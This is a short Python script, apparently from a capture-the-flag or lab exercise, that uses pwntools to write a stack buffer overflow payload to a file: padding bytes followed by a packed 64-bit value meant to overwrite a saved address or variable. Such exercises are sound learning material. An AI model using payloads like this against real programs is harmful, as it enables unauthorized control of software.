from pwn import *

fd = open("payload", "wb")

payload = b'A' * 16
payload += b'B'*8
payload += p64(65)

fd.write(payload)
fd.close()
